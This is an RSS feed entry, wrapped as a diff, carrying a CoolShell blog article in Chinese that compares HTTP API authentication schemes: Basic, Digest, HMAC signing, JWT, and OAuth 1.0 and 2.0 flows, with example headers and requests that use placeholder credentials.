@@ -1,0 +1,478 @@
+<?xml version="1.0" encoding="UTF-8"?><rss version="2.0"
+	xmlns:content="http://purl.org/rss/1.0/modules/content/"
+	xmlns:wfw="http://wellformedweb.org/CommentAPI/"
+	xmlns:dc="http://purl.org/dc/elements/1.1/"
+	xmlns:atom="http://www.w3.org/2005/Atom"
+	xmlns:sy="http://purl.org/rss/1.0/modules/syndication/"
+	xmlns:slash="http://purl.org/rss/1.0/modules/slash/"
+	>
+
+<channel>
+	<title>OAuth | 酷 壳 - CoolShell</title>
+	<atom:link href="https://coolshell.cn/tag/oauth/feed" rel="self" type="application/rss+xml" />
+	<link>https://coolshell.cn</link>
+	<description>享受编程和技术所带来的快乐 - Coding Your Ambition</description>
+	<lastBuildDate>Thu, 15 Sep 2022 10:15:46 +0000</lastBuildDate>
+	<language>zh-CN</language>
+	<sy:updatePeriod>
+	hourly	</sy:updatePeriod>
+	<sy:updateFrequency>
+	1	</sy:updateFrequency>
+	<generator>https://wordpress.org/?v=6.2</generator>
+	<item>
+		<title>HTTP API 认证授权术</title>
+		<link>https://coolshell.cn/articles/19395.html</link>
+					<comments>https://coolshell.cn/articles/19395.html#comments</comments>
+		
+		<dc:creator><![CDATA[陈皓]]></dc:creator>
+		<pubDate>Thu, 09 May 2019 13:37:29 +0000</pubDate>
+				<category><![CDATA[程序设计]]></category>
+		<category><![CDATA[网络安全]]></category>
+		<category><![CDATA[HMAC]]></category>
+		<category><![CDATA[HTTPS]]></category>
+		<category><![CDATA[JWT]]></category>
+		<category><![CDATA[OAuth]]></category>
+		<category><![CDATA[Security]]></category>
+		<category><![CDATA[安全]]></category>
+		<guid isPermaLink="false">https://coolshell.cn/?p=19395</guid>
+
+					<description><![CDATA[<p>我们知道，HTTP是无状态的，所以，当我们需要获得用户是否在登录的状态时，我们需要检查用户的登录状态，一般来说，用户的登录成功后，服务器会发一个登录凭证（又被叫...</p>
+<p class="read-more"><a class="btn btn-default" href="https://coolshell.cn/articles/19395.html"> Read More<span class="screen-reader-text">  Read More</span></a></p>
+The post <a href="https://coolshell.cn/articles/19395.html">HTTP API 认证授权术</a> first appeared on <a href="https://coolshell.cn">酷 壳 - CoolShell</a>.]]></description>
+										<content:encoded><![CDATA[<p><script async src="https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js?client=ca-pub-3415450859608158"
+     crossorigin="anonymous"></script><img decoding="async" loading="lazy" class="alignright size-sup_wechat_big " src="https://coolshell.cn/wp-content/uploads/2019/05/Authorization-360x200.png" alt="" width="360" height="200" />我们知道，HTTP是无状态的，所以，当我们需要获得用户是否在登录的状态时，我们需要检查用户的登录状态，一般来说，用户的登录成功后，服务器会发一个登录凭证（又被叫作Token），就像你去访问某个公司，在前台被认证过合法后，这个公司的前台会给你的一个访客卡一样，之后，你在这个公司内去到哪都用这个访客卡来开门，而不再校验你是哪一个人。在计算机的世界里，这个登录凭证的相关数据会放在两种地方，一个地方在用户端，以Cookie的方式（一般不会放在浏览器的Local Storage，因为这很容易出现登录凭证被XSS攻击），另一个地方是放在服务器端，又叫Session的方式（SessonID存于Cookie）。</p>
+<p>但是，这个世界还是比较复杂的，除了用户访问，还有用户委托的第三方的应用，还有企业和企业间的调用，这里，我想把业内常用的一些 API认证技术相对系统地总结归纳一下，这样可以让大家更为全面的了解这些技术。<strong>注意，这是一篇长文！</strong></p>
+<p>本篇文章会覆盖如下技术：</p>
+<ul>
+<li>HTTP Basic</li>
+<li>Digest Access</li>
+<li>App Secret Key + HMAC</li>
+<li>JWT &#8211; JSON Web Tokens</li>
+<li>OAuth 1.0 &#8211; 3 legged &amp; 2 legged</li>
+<li>OAuth 2.0 &#8211; Authentication Code &amp; Client Credential</li>
+</ul>
+<p><span id="more-19395"></span></p>
+<h4>HTTP Basic</h4>
+<p>HTTP Basic 是一个非常传统的API认证技术，也是一个比较简单的技术。这个技术也就是使用 <code>username</code>和 <code>password</code> 来进行登录。整个过程被定义在了 <a href="http://tools.ietf.org/html/rfc2617" target="_blank" rel="noopener noreferrer">RFC 2617</a> 中，也被描述在了 <a href="https://en.wikipedia.org/wiki/Basic_access_authentication" target="_blank" rel="noopener noreferrer">Wikipedia: Basic Access Authentication</a> 词条中，同时也可以参看 <a href="https://developer.mozilla.org/en-US/docs/Web/HTTP/Authentication" target="_blank" rel="noopener noreferrer">MDN HTTP Authentication</a></p>
+<p>其技术原理如下：</p>
+<ol>
+<li>把 <code>username</code>和 <code>password</code> 做成  <code>username:password</code> 的样子（用冒号分隔）</li>
+<li>进行Base64编码。<code>Base64("username:password")</code> 得到一个字符串（如：把 <code>haoel:coolshell</code> 进行base64 后可以得到 <code>aGFvZW86Y29vbHNoZWxsCg</code> ）</li>
+<li>把 <code>aGFvZW86Y29vbHNoZWxsCg</code>放到HTTP头中 <a href="https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Authorization" target="_blank" rel="noopener noreferrer"><code>Authorization</code></a> 字段中，形成 <code>Authorization: Basic aGFvZW86Y29vbHNoZWxsCg</code>，然后发送到服务端。</li>
+<li>服务端如果没有在头里看到认证字段，则返回401错，以及一个个<code><code></code></code><a href="https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/WWW-Authenticate" target="_blank" rel="noopener noreferrer">WWW-Authenticate</a><code>: Basic Realm='HelloWorld'</code> 之类的头要求客户端进行认证。之后如果没有认证通过，则返回一个401错。如果服务端认证通过，那么会返回200。</li>
+</ol>
+<p>我们可以看到，使用Base64的目的无非就是为了把一些特殊的字符给搞掉，这样就可以放在HTTP协议里传输了。而这种方式的问题最大的问题就是把用户名和口令放在网络上传，所以，一般要配合TLS/SSL的安全加密方式来使用。我们可以看到 <a href="https://developer.atlassian.com/cloud/jira/platform/jira-rest-api-basic-authentication/" target="_blank" rel="noopener noreferrer">JIRA Cloud 的API认证</a>支持HTTP Basic 这样的方式。</p>
+<p>但我们还是要知道，这种把用户名和密码同时放在公网上传输的方式有点不太好，因为Base64不是加密协议，而是编码协议，所以就算是有HTTPS作为安全保护，给人的感觉还是不放心。</p>
+<h4>Digest Access</h4>
+<p>中文称“HTTP 摘要认证”，最初被定义在了 <a href="https://tools.ietf.org/html/rfc2069" target="_blank" rel="noopener noreferrer">RFC 2069</a> 文档中（后来被 <a class="external mw-magiclink-rfc" href="https://tools.ietf.org/html/rfc2617" target="_blank" rel="nofollow noopener noreferrer">RFC 2617</a> 引入了一系列安全增强的选项；“保护质量”(qop)、随机数计数器由客户端增加、以及客户生成的随机数）。</p>
+<p>其基本思路是，请求方把用户名口令和域做一个MD5 &#8211;  <code>MD5(username:realm:password)</code> 然后传给服务器，这样就不会在网上传用户名和口令了，但是，因为用户名和口令基本不会变，所以，这个MD5的字符串也是比较固定的，因此，这个认证过程在其中加入了两个事，一个是 <code>nonce</code> 另一个是 <code>qop</code></p>
+<ul>
+<li>首先，调用方发起一个普通的HTTP请求。比如：<code>GET /coolshell/admin/ HTTP/1.1</code></li>
+<li>服务端自然不能认证能过，服务端返回401错误，并且在HTTP头里的 <code>WWW-Authenticate</code> 包含如下信息：</li>
+</ul>
+<pre style="padding-left: 40px;"> WWW-Authenticate: Digest realm="testrealm@host.com",
+                        qop="auth,auth-int",
+                        nonce="dcd98b7102dd2f0e8b11d0f600bfb0c093",
+                        opaque="5ccc069c403ebaf9f0171e9517f40e41"</pre>
+<ul>
+<li>其中的 <code>nonce</code> 为服务器端生成的随机数，然后，客户端做 <code>HASH1=MD5(MD5(username:realm:password):nonce:cnonce)</code> ，其中的 <code>cnonce</code> 为客户端生成的随机数，这样就可以使得整个MD5的结果是不一样的。</li>
+<li>如果 <code>qop</code> 中包含了 <code>auth</code> ，那么还得做  <code>HASH2=MD5(method:digestURI)</code> 其中的 <code>method</code> 就是HTTP的请求方法（GET/POST&#8230;），<code>digestURI</code> 是请求的URL。</li>
+<li>如果 <code>qop</code> 中包含了 <code>auth-init</code> ，那么，得做  <code>HASH2=MD5(method:digestURI:MD5(entityBody))</code> 其中的 <code>entityBody</code> 就是HTTP请求的整个数据体。</li>
+<li>然后，得到 <code>response = MD5(HASH1:nonce:nonceCount:cnonce:qop:HASH2)</code> 如果没有 <code>qop</code>则 <code>response = MD5(HA1:nonce:HA2)</code></li>
+<li>最后，我们的客户端对服务端发起如下请求—— 注意HTTP头的 <code>Authorization: Digest ...</code></li>
+</ul>
+<pre style="padding-left: 40px;">GET /dir/index.html HTTP/1.0
+Host: localhost
+Authorization: Digest username="Mufasa",
+                     realm="testrealm@host.com",
+                     nonce="dcd98b7102dd2f0e8b11d0f600bfb0c093",
+                     uri="%2Fcoolshell%2Fadmin",
+                     qop=auth,
+                     nc=00000001,
+                     cnonce="0a4f113b",
+                     response="6629fae49393a05397450978507c4ef1",
+                     opaque="5ccc069c403ebaf9f0171e9517f40e41"</pre>
+<p>维基百科上的 <a href="https://en.wikipedia.org/wiki/Digest_access_authentication" target="_blank" rel="noopener noreferrer">Wikipedia: Digest access authentication</a> 词条非常详细地描述了这个细节。</p>
+<p>摘要认证这个方式会比之前的方式要好一些，因为没有在网上传递用户的密码，而只是把密码的MD5传送过去，相对会比较安全，而且，其并不需要是否TLS/SSL的安全链接。但是，<strong>别看这个算法这么复杂，最后你可以发现，整个过程其实关键是用户的password，这个password如果不够得杂，其实是可以被暴力破解的，而且，整个过程是非常容易受到中间人攻击</strong>——比如一个中间人告诉客户端需要的 Basic 的认证方式 或是 老旧签名认证方式（RFC2069）。</p>
+<h4>App Secret Key + HMAC</h4>
+<p>先说HMAC技术，这个东西来自于MAC &#8211; <a href="https://en.wikipedia.org/wiki/Message_authentication_code" target="_blank" rel="noopener noreferrer">Message Authentication Code</a>，是一种用于给消息签名的技术，也就是说，我们怕消息在传递的过程中被人修改，所以，我们需要用对消息进行一个MAC算法，得到一个摘要字串，然后，接收方得到消息后，进行同样的计算，然后比较这个MAC字符串，如果一致，则表明没有被修改过（整个过程参看下图）。而HMAC &#8211; <a href="https://en.wikipedia.org/wiki/HMAC" target="_blank" rel="noopener noreferrer">Hash-based Authenticsation Code</a>，指的是利用Hash技术完成这一工作，比如：SHA-256算法。</p>
+<p>&nbsp;</p>
+<p><img decoding="async" loading="lazy" class="aligncenter size-large" src="https://coolshell.cn/wp-content/uploads/2019/05/MAC-1024x634.png" alt="" width="640" height="396" /></p>
+<p style="text-align: center;">（图片来自 <a href="https://en.wikipedia.org/wiki/Message_authentication_code" target="_blank" rel="noopener noreferrer">Wikipedia &#8211; MAC 词条</a> ）</p>
+<p>我们再来说App ID，这个东西跟验证没有关系，只是用来区分，是谁来调用API的，就像我们每个人的身份证一样，只是用来标注不同的人，不是用来做身份认证的。与前面的不同之处是，这里，我们需要用App ID 来映射一个用于加密的密钥，这样一来，我们就可以在服务器端进行相关的管理，我们可以生成若干个密钥对（AppID, AppSecret），并可以有更细粒度的操作权限管理。</p>
+<p>把AppID和HMAC用于API认证，目前来说，玩得最好最专业的应该是AWS了，我们可以通过<a href="https://docs.aws.amazon.com/zh_cn/general/latest/gr/sigv4-create-canonical-request.html" target="_blank" rel="noopener noreferrer">S3的API请求签名文档</a>看到AWS是怎么玩的。整个过程还是非常复杂的，可以通过下面的图片流程看个大概。基本上来说，分成如下几个步骤：</p>
+<ol>
+<li>把HTTP的请求（方法、URI、查询字串、头、签名头，body）打个包叫 <code>CanonicalRequest</code>，作个SHA-256的签名，然后再做一个base16的编码</li>
+<li>把上面的这个签名和签名算法 <code>AWS4-HMAC-SHA256</code>、时间戳、Scop，再打一个包，叫 <code>StringToSign</code>。</li>
+<li>准备签名，用 <code>AWSSecretAccessKey</code>来对日期签一个 <code>DataKey</code>，再用 <code>DataKey</code> 对要操作的Region签一个 <code>DataRegionKey</code> ，再对相关的服务签一个<code>DataRegionServiceKey</code> ，最后得到 <code>SigningKey</code>.</li>
+<li>用第三步的 <code>SigningKey</code>来对第二步的 <code>StringToSign</code> 签名。</li>
+</ol>
+<p><img decoding="async" loading="lazy" class="aligncenter size-full" src="https://coolshell.cn/wp-content/uploads/2019/05/sigV4-using-query-params.png" alt="" width="653" height="599" /></p>
+<p>&nbsp;</p>
+<p>最后，发出HTTP Request时，在HTTP头的 <code>Authorization</code>字段中放入如下的信息：</p>
+<pre class="programlisting" style="padding-left: 40px;">Authorization: AWS4-HMAC-SHA256 
+               Credential=AKIDEXAMPLE/20150830/us-east-1/iam/aws4_request, 
+               SignedHeaders=content-type;host;x-amz-date, 
+               Signature=5d672d79c15b13162d9279b0855cfba6789a8edb4c82c400e06b5924a6f2b5d7
+</pre>
+<p>&nbsp;</p>
+<p>其中的  <code>AKIDEXAMPLE</code> 是 AWS Access Key ID， 也就是所谓的 AppID，服务器端会根据这个AppID来查相关的 Secret Access Key，然后再验证签名。如果，你对这个过程有点没看懂的话，你可以读一读这篇文章——《<a href="https://czak.pl/2015/09/15/s3-rest-api-with-curl.html" target="_blank" rel="noopener noreferrer">Amazon S3 Rest API with curl</a>》这篇文章里有好些代码，代码应该是最有细节也是最准确的了。</p>
+<p>这种认证的方式好处在于，AppID和AppSecretKey，是由服务器的系统开出的，所以，是可以被管理的，AWS的IAM就是相关的管理，其管理了用户、权限和其对应的AppID和AppSecretKey。但是不好的地方在于，这个东西没有标准 ，所以，各家的实现很不一致。比如： <a href="https://github.com/acquia/http-hmac-spec" target="_blank" rel="noopener noreferrer">Acquia 的 HMAC</a>，<a href="https://pay.weixin.qq.com/wiki/doc/api/jsapi.php?chapter=4_3" target="_blank" rel="noopener noreferrer">微信的签名算法</a> （这里，我们需要说明一下，微信的API没有遵循HTTP协议的标准，把认证信息放在HTTP 头的 <code>Authorization</code> 里，而是放在body里）</p>
+<h4>JWT &#8211; JSON Web Tokens</h4>
+<p>JWT是一个比较标准的认证解决方案，这个技术在Java圈里应该用的是非常普遍的。JWT签名也是一种MAC（<a href="https://en.wikipedia.org/wiki/Message_authentication_code" target="_blank" rel="noopener noreferrer">Message Authentication Code</a>）的方法。JWT的签名流程一般是下面这个样子：</p>
+<ol>
+<li>用户使用用户名和口令到认证服务器上请求认证。</li>
+<li>认证服务器验证用户名和口令后，以服务器端生成JWT Token，这个token的生成过程如下：
+<ul>
+<li>认证服务器还会生成一个 Secret Key（密钥）</li>
+<li>对JWT Header和 JWT Payload分别求Base64。在Payload可能包括了用户的抽象ID和的过期时间。</li>
+<li>用密钥对JWT签名 <code>HMAC-SHA256(SecertKey, Base64UrlEncode(JWT-Header)+'.'+Base64UrlEncode(JWT-Payload));</code></li>
+</ul>
+</li>
+<li>然后把 <code>base64(header).base64(payload).signature</code> 作为 JWT token返回客户端。</li>
+<li>客户端使用JWT Token向应用服务器发送相关的请求。这个JWT Token就像一个临时用户权证一样。</li>
+</ol>
+<p>当应用服务器收到请求后：</p>
+<ol>
+<li>应用服务会检查 JWT  Token，确认签名是正确的。</li>
+<li>然而，因为只有认证服务器有这个用户的Secret Key（密钥），所以，应用服务器得把JWT Token传给认证服务器。</li>
+<li>认证服务器通过JWT Payload 解出用户的抽象ID，然后通过抽象ID查到登录时生成的Secret Key，然后再来检查一下签名。</li>
+<li>认证服务器检查通过后，应用服务就可以认为这是合法请求了。</li>
+</ol>
+<p>我们可以看以，上面的这个过程，是在认证服务器上为用户动态生成 Secret Key的，应用服务在验签的时候，需要到认证服务器上去签，这个过程增加了一些网络调用，所以，JWT除了支持HMAC-SHA256的算法外，还支持RSA的非对称加密的算法。</p>
+<p>使用RSA非对称算法，在认证服务器这边放一个私钥，在应用服务器那边放一个公钥，认证服务器使用私钥加密，应用服务器使用公钥解密，这样一来，就不需要应用服务器向认证服务器请求了，但是，RSA是一个很慢的算法，所以，虽然你省了网络调用，但是却费了CPU，尤其是Header和Payload比较长的时候。所以，一种比较好的玩法是，如果我们把header 和 payload简单地做SHA256，这会很快，然后，我们用RSA加密这个SHA256出来的字符串，这样一来，RSA算法就比较快了，而我们也做到了使用RSA签名的目的。</p>
+<p>最后，我们只需要使用一个机制在认证服务器和应用服务器之间定期地换一下公钥私钥对就好了。</p>
+<p>这里强烈建议全文阅读 Anglar 大学的 《<a href="https://blog.angular-university.io/angular-jwt/" target="_blank" rel="noopener noreferrer">JSW：The Complete Guide to JSON Web Tokens</a>》</p>
+<h4>OAuth 1.0</h4>
+<p>OAuth也是一个API认证的协议，这个协议最初在2006年由Twitter的工程师在开发OpenID实现的时候和社交书签网站Ma.gnolia时发现，没有一种好的委托授权协议，后来在2007年成立了一个OAuth小组，知道这个消息后，Google员工也加入进来，并完善有善了这个协议，在2007年底发布草案，过一年后，在2008年将OAuth放进了IETF作进一步的标准化工作，最后在2010年4月，正式发布OAuth 1.0，即：<a href="https://tools.ietf.org/html/rfc5849" target="_blank" rel="noopener noreferrer">RFC 5849</a> （这个RFC比起TCP的那些来说读起来还是很轻松的），不过，如果你想了解其前身的草案，可以读一下 <a href="http://oauth.net/core/1.0a/" target="_blank" rel="noopener noreferrer">OAuth Core 1.0 Revision A</a> ，我在下面做个大概的描述。</p>
+<p>根据RFC 5849，可以看到 OAuth 的出现，目的是为了，用户为了想使用一个第三方的网络打印服务来打印他在某网站上的照片，但是，用户不想把自己的用户名和口令交给那个第三方的网络打印服务，但又想让那个第三方的网络打印服务来访问自己的照片，为了解决这个授权的问题，OAuth这个协议就出来了。</p>
+<ul>
+<li>这个协议有三个角色：
+<ul>
+<li><strong>User（照片所有者-用户）</strong></li>
+<li><strong>Consumer（第三方照片打印服务）</strong></li>
+<li><strong>Service Provider（照片存储服务）</strong></li>
+</ul>
+</li>
+<li>这个协义有三个阶段：
+<ul>
+<li><strong>Consumer获取Request Token</strong></li>
+<li><strong>Service Provider 认证用户并授权Consumer</strong></li>
+<li><strong>Consumer获取Access Token调用API访问用户的照片</strong></li>
+</ul>
+</li>
+</ul>
+<p>整个授权过程是这样的：</p>
+<ol>
+<li>Consumer（第三方照片打印服务）需要先上Service Provider获得开发的 Consumer Key 和 Consumer Secret</li>
+<li>当 User 访问 Consumer 时，Consumer 向 Service Provide 发起请求请求Request Token （需要对HTTP请求签名）</li>
+<li>Service Provide 验明 Consumer 是注册过的第三方服务商后，返回 Request Token（<code>oauth_token</code>）和 Request Token Secret （<code>oauth_token_secret</code>）</li>
+<li>Consumer 收到 Request Token 后，使用HTTP GET 请求把 User 切到 Service Provide 的认证页上（其中带上Request Token），让用户输入他的用户和口令。</li>
+<li>Service Provider 认证 User 成功后，跳回 Consumer，并返回 Request Token （<code>oauth_token</code>）和 Verification Code（<code>oauth_verifier</code>）</li>
+<li>接下来就是签名请求，用Request Token 和 Verification Code 换取 Access Token （<code>oauth_token</code>）和 Access Token Secret (<code>oauth_token_secret</code>)</li>
+<li>最后使用Access Token 访问用户授权访问的资源。</li>
+</ol>
+<p>下图附上一个Yahoo!的流程图可以看到整个过程的相关细节。</p>
+<p><img decoding="async" loading="lazy" class="aligncenter size-full" src="https://coolshell.cn/wp-content/uploads/2019/05/oauth_graph.gif" alt="" width="660" height="992" /></p>
+<p>因为上面这个流程有三方：User，Consumer 和 Service Provide，所以，又叫 3-legged flow，三脚流程。OAuth 1.0 也有不需要用户参与的，只有Consumer 和 Service Provider 的， 也就是 2-legged flow 两脚流程，其中省掉了用户认证的事。整个过程如下所示：</p>
+<ol>
+<li>Consumer（第三方照片打印服务）需要先上Service Provider获得开发的 Consumer Key 和 Consumer Secret</li>
+<li>Consumer 向 Service Provide 发起请求请求Request Token （需要对HTTP请求签名）</li>
+<li>Service Provide 验明 Consumer 是注册过的第三方服务商后，返回 Request Token（<code>oauth_token</code>）和 Request Token Secret （<code>oauth_token_secret</code>）</li>
+<li>Consumer 收到 Request Token 后，直接换取 Access Token （<code>oauth_token</code>）和 Access Token Secret (<code>oauth_token_secret</code>)</li>
+<li>最后使用Access Token 访问用户授权访问的资源。</li>
+</ol>
+<p>最后，再来说一说OAuth中的签名。</p>
+<ul>
+<li>我们可以看到，有两个密钥，一个是Consumer注册Service Provider时由Provider颁发的 Consumer Secret，另一个是 Token Secret。</li>
+<li>签名密钥就是由这两具密钥拼接而成的，其中用 <code>&amp;</code>作连接符。假设 Consumer Secret 为 <code>j49sk3j29djd</code> 而 Token Secret 为<code>dh893hdasih9</code>那个，签名密钥为：<code>j49sk3j29djd&amp;dh893hdasih9</code></li>
+<li>在请求Request/Access Token的时候需要对整个HTTP请求进行签名（使用HMAC-SHA1和HMAC-RSA1签名算法），请求头中需要包括一些OAuth需要的字段，如：
+<ul>
+<li><strong>Consumer Key</strong> ： 也就是所谓的AppID</li>
+<li><strong>Token</strong>： Request Token 或 Access Token</li>
+<li><strong>Signature Method</strong> ：签名算法比如：HMAC-SHA1</li>
+<li><strong>Timestamp</strong>：过期时间</li>
+<li><strong>Nonce</strong>：随机字符串</li>
+<li><strong>Call Back</strong>：回调URL</li>
+</ul>
+</li>
+</ul>
+<p>下图是整个签名的示意图：</p>
+<p><img decoding="async" loading="lazy" class="aligncenter size-full" src="https://coolshell.cn/wp-content/uploads/2019/05/oauth_singature.png" alt="" width="715" height="877" /></p>
+<p>图片还是比较直观的，我就不多解释了。</p>
+<h4>OAuth 2.0</h4>
+<p>在前面，我们可以看到，从Digest Access， 到AppID+HMAC，再到JWT，再到OAuth 1.0，这些个API认证都是要向Client发一个密钥（或是用密码）然后用HASH或是RSA来签HTTP的请求，<strong>这其中有个主要的原因是，以前的HTTP是明文传输，所以，在传输过程中很容易被篡改，于是才搞出来一套的安全签名机制</strong>，所以，这些个认证的玩法是可以在HTTP明文协议下玩的。</p>
+<p>这种使用签名方式大家可以看到是比较复杂的，所以，对于开发者来说，也是很不友好的，在组织签名的那些HTTP报文的时候，各种，URLEncode和Base64，还要对Query的参数进行排序，然后有的方法还要层层签名，非常容易出错，另外，这种认证的安全粒度比较粗，授权也比较单一，对于有终端用户参与的移动端来说也有点不够。所以，在2012年的时候，OAuth 2.0 的 <a href="https://tools.ietf.org/html/rfc6749" target="_blank" rel="noopener noreferrer">RFC 6749</a> 正式放出。</p>
+<p><strong>OAuth 2.0依赖于TLS/SSL的链路加密技术（HTTPS），完全放弃了签名的方式，认证服务器再也不返回什么 token secret 的密钥了，所以，OAuth 2.0是完全不同于1.0 的，也是不兼容的</strong>。目前，Facebook 的 Graph API 只支持OAuth 2.0协议，Google 和 Microsoft Azure 也支持Auth 2.0，国内的微信和支付宝也支持使用OAuth 2.0。</p>
+<p>下面，我们来重点看一下OAuth 2.0的两个主要的Flow：</p>
+<ul>
+<li>一个是Authorization Code Flow， 这个是 3 legged 的</li>
+<li>一个是Client Credential Flow，这个是 2 legged 的。</li>
+</ul>
+<h5><strong>Authorization Code Flow</strong></h5>
+<p>Authorization Code 是最常使用的OAuth 2.0的授权许可类型，它适用于用户给第三方应用授权访问自己信息的场景。这个Flow也是OAuth 2.0四个Flow中我个人觉得最完整的一个Flow，其流程图如下所示。</p>
+<p><img decoding="async" loading="lazy" class="aligncenter size-full " src="https://coolshell.cn/wp-content/uploads/2019/05/auth_code_flow.png" alt="" width="621" height="505" /></p>
+<p>&nbsp;</p>
+<p>下面是对这个流程的一个细节上的解释：</p>
+<p>1）当用户（Resource Owner）访问第三方应用（Client）的时候，第三方应用会把用户带到认证服务器（Authorization Server）上去，主要请求的是 <code>/authorize</code> API，其中的请求方式如下所示。</p>
+<pre style="padding-left: 40px;">https://login.authorization-server.com/authorize?
+        client_id=6731de76-14a6-49ae-97bc-6eba6914391e
+        &amp;response_type=code
+        &amp;redirect_uri=http%3A%2F%2Fexample-client.com%2Fcallback%2F
+        &amp;scope=read
+        &amp;state=xcoiv98CoolShell3kch</pre>
+<p style="padding-left: 40px;">其中：</p>
+<ul>
+<li style="list-style-type: none;">
+<ul>
+<li><code>client_id</code>为第三方应用的App ID</li>
+<li><code>response_type=code</code>为告诉认证服务器，我要走Authorization Code Flow。</li>
+<li><code>redirect_uri</code>意思是我跳转回第三方应用的URL</li>
+<li><code>scope</code>意是相关的权限</li>
+<li><code>state</code> 是一个随机的字符串，主要用于防CSRF攻击。</li>
+</ul>
+</li>
+</ul>
+<p>2）当Authorization Server收到这个URL请求后，其会通过 <code>client_id</code>来检查 <code>redirect_uri</code>和 <code>scope</code>是否合法，如果合法，则弹出一个页面，让用户授权（如果用户没有登录，则先让用户登录，登录完成后，出现授权访问页面）。</p>
+<p>3）当用户授权同意访问以后，Authorization Server 会跳转回 Client ，并以其中加入一个 Authorization Code。 如下所示：</p>
+<pre style="padding-left: 40px;">https://example-client.com/callback?
+        code=Yzk5ZDczMzRlNDEwYlrEqdFSBzjqfTG
+        &amp;state=xcoiv98CoolShell3kch</pre>
+<p style="padding-left: 40px;">我们可以看到，</p>
+<ul>
+<li style="list-style-type: none;">
+<ul>
+<li>请流动的链接是第 1）步中的 <code>redirect_uri</code></li>
+<li>其中的 <code>state</code> 的值也和第 1）步的 <code>state</code>一样。</li>
+</ul>
+</li>
+</ul>
+<p>4）接下来，Client 就可以使用 Authorization Code 获得 Access Token。其需要向 Authorization Server 发出如下请求。</p>
+<pre style="padding-left: 40px;">POST /oauth/token HTTP/1.1
+Host: authorization-server.com
+ 
+code=Yzk5ZDczMzRlNDEwYlrEqdFSBzjqfTG
+&amp;grant_type=code
+&amp;redirect_uri=https%3A%2F%2Fexample-client.com%2Fcallback%2F
+&amp;client_id=6731de76-14a6-49ae-97bc-6eba6914391e
+&amp;client_secret=JqQX2PNo9bpM0uEihUPzyrh</pre>
+<p>5）如果没什么问题，Authorization 会返回如下信息。</p>
+<pre style="padding-left: 40px;">{
+  "access_token": "iJKV1QiLCJhbGciOiJSUzI1NiI",
+  "refresh_token": "1KaPlrEqdFSBzjqfTGAMxZGU",
+  "token_type": "bearer",
+  "expires": 3600,
+  "id_token": "eyJ0eXAiOiJKV1QiLCJhbGciO.eyJhdWQiOiIyZDRkM..."
+}</pre>
+<p style="padding-left: 40px;">其中，</p>
+<ul>
+<li style="list-style-type: none;">
+<ul>
+<li><code>access_token</code>就是访问请求令牌了</li>
+<li><code>refresh_token</code>用于刷新 <code>access_token</code></li>
+<li><code>id_token</code> 是JWT的token，其中一般会包含用户的OpenID</li>
+</ul>
+</li>
+</ul>
+<p>6）接下来就是用 Access Token 请求用户的资源了。</p>
+<pre style="padding-left: 40px;">GET /v1/user/pictures
+Host: https://example.resource.com
+
+Authorization: Bearer iJKV1QiLCJhbGciOiJSUzI1NiI</pre>
+<p>&nbsp;</p>
+<h5> Client Credential Flow</h5>
+<p>Client Credential 是一个简化版的API认证，主要是用于认证服务器到服务器的调用，也就是没有用户参与的的认证流程。下面是相关的流程图。</p>
+<p><img decoding="async" loading="lazy" class="aligncenter size-full" src="https://coolshell.cn/wp-content/uploads/2019/05/client_credentials_flow.png" alt="" width="549" height="414" /></p>
+<p>这个过程非常简单，本质上就是Client用自己的 <code>client_id</code>和 <code>client_secret</code>向Authorization Server 要一个 Access Token，然后使用Access Token访问相关的资源。</p>
+<p>请求示例</p>
+<pre style="padding-left: 40px;">POST /token HTTP/1.1
+Host: server.example.com
+Content-Type: application/x-www-form-urlencoded
+
+grant_type=client_credentials
+&amp;client_id=czZCaGRSa3F0Mzpn
+&amp;client_secret=7Fjfp0ZBr1KtDRbnfVdmIw</pre>
+<p>返回示例</p>
+<pre style="padding-left: 40px;">{
+  "access_token":"MTQ0NjJkZmQ5OTM2NDE1ZTZjNGZmZjI3",
+  "token_type":"bearer",
+  "expires_in":3600,
+  "refresh_token":"IwOGYzYTlmM2YxOTQ5MGE3YmNmMDFkNTVk",
+  "scope":"create"
+}</pre>
+<p>这里，容我多扯一句，微信公从平台的开发文档中，使用了OAuth 2.0 的 Client Credentials的方式（参看文档“<a href="https://mp.weixin.qq.com/wiki?t=resource/res_main&amp;id=mp1421140183" target="_blank" rel="noopener noreferrer">微信公众号获取access token</a>”），我截了个图如下所谓。我们可以看到，<strong>微信公众号使用的是GET方式的请求，把AppID和AppSecret放在了URL中，虽然这也符合OAuth 2.0，但是并不好，因为大多数网关代理会把整个URI请求记到日志中。我们只要脑补一下腾讯的网关的Access Log，里面的日志一定会有很多的各个用户的AppID和AppSecret……</strong></p>
+<p><img decoding="async" loading="lazy" class="aligncenter size-large" src="https://coolshell.cn/wp-content/uploads/2019/05/wechat.dev_-1024x876.png" alt="" width="640" height="548" /></p>
+<p>&nbsp;</p>
+<h4>小结</h4>
+<p>讲了这么多，我们来小结一下（下面的小结可能会有点散）</p>
+<h5>两个术语和三个概念</h5>
+<ul>
+<li>区分两个术语：Authentication（认证） 和 Authorization （授权），前者是证明请求者是身份，就像身份证一样，后者是为了获得权限。身份是区别于别人的证明，而权限是证明自己的特权。Authentication为了证明操作的这个人就是他本人，需要提供密码、短信验证码，甚至人脸识别。Authorization 则是不需要在所有的请求都需要验人，是在经过Authorization后得到一个Token，这就是Authorization。就像护照和签证一样。</li>
+<li>区分三个概念：编码Base64Encode、签名HMAC、加密RSA。Base64编码是为了更好的传输（没有怪异的字符，可以传输二进制文件），等同于明文，HMAC签名是为了信息不能被篡改，RSA加密是为了不让别人看到是什么信息。</li>
+</ul>
+<h5>明白一些初衷</h5>
+<ul>
+<li>使用复杂地HMAC哈希签名方式主要是应对当年没有TLS/SSL加密链路的情况。</li>
+<li>JWT把 <code>uid</code> 放在 Token中目的是为了去掉状态，但不能让用户修改，所以需要签名。</li>
+<li>OAuth 1.0区分了两个事，一个是第三方的Client，一个是真正的用户，其先拿Request Token，再换Access Token的方法主要是为了把第三方应用和用户区分开来。</li>
+<li>用户的Password是用户自己设置的，复杂度不可控，服务端颁发的Serect会很复杂，但主要目的是为了容易管理，可以随时注销掉。</li>
+<li>OAuth 协议有比所有认证协议有更为灵活完善的配置，如果使用AppID/AppSecret签名的方式，又需要做到可以有不同的权限和可以随时注销，那么你得开发一个像AWS的IAM这样的账号和密钥对管理的系统。</li>
+</ul>
